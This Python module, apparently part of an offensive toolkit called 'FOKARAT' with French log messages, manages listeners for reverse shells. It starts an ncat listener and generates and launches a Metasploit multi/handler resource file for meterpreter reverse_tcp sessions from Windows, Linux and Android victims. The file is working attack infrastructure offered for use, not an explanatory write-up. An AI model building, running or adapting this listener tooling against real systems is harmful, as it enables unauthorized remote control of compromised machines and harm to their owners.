"""FOKARAT - Gestionnaire de listeners (ncat + Metasploit)"""
import os
import subprocess
import threading
import time
from core.logger import Logger
from core.utils import ask_lhost_lport, which

logger = Logger()


class ListenerManager:
    def __init__(self):
        self.processes = []

    def start_ncat(self, config):
        if not which("ncat"):
            logger.error("ncat n'est pas installé.")
            return False
        lhost, lport = ask_lhost_lport(config)
        logger.info(f"Démarrage ncat sur {lhost}:{lport}...")
        try:
            proc = subprocess.Popen(["ncat", "-lvnp", str(lport)])
            self.processes.append(proc)
            logger.success(f"ncat écoute sur {lport}")
            return True
        except Exception as e:
            logger.error(f"Erreur ncat : {e}")
            return False

    def start_msf(self, config):
        if not which("msfconsole"):
            logger.error("msfconsole n'est pas installé.")
            return False
        lhost, lport = ask_lhost_lport(config)

        print("\n  Payload à écouter :")
        print("    [1] windows/x64/meterpreter/reverse_tcp")
        print("    [2] windows/meterpreter/reverse_tcp")
        print("    [3] linux/x64/meterpreter/reverse_tcp")
        print("    [4] android/meterpreter/reverse_tcp")
        choice = input("  [>] Choix [1] : ").strip() or "1"
        payloads = {
            "1": "windows/x64/meterpreter/reverse_tcp",
            "2": "windows/meterpreter/reverse_tcp",
            "3": "linux/x64/meterpreter/reverse_tcp",
            "4": "android/meterpreter/reverse_tcp",
        }
        payload = payloads.get(choice, payloads["1"])

        rc_content = f"""use exploit/multi/handler
set PAYLOAD {payload}
set LHOST {lhost}
set LPORT {lport}
set ExitOnSession false
exploit -j -z
"""
        rc_file = "listener.rc"
        with open(rc_file, "w") as f:
            f.write(rc_content)

        logger.info(f"Démarrage Metasploit handler ({payload})...")
        try:
            proc = subprocess.Popen(["msfconsole", "-q", "-r", rc_file])
            self.processes.append(proc)
            logger.success(f"Metasploit handler lancé ({lhost}:{lport})")
            return True
        except Exception as e:
            logger.error(f"Erreur MSF : {e}")
            return False

    def stop_all(self):
        for p in self.processes:
            try:
                p.terminate()
                p.wait(timeout=3)
            except Exception:
                try:
                    p.kill()
                except Exception:
                    pass
        self.processes.clear()
        logger.info("Tous les listeners arrêtés.")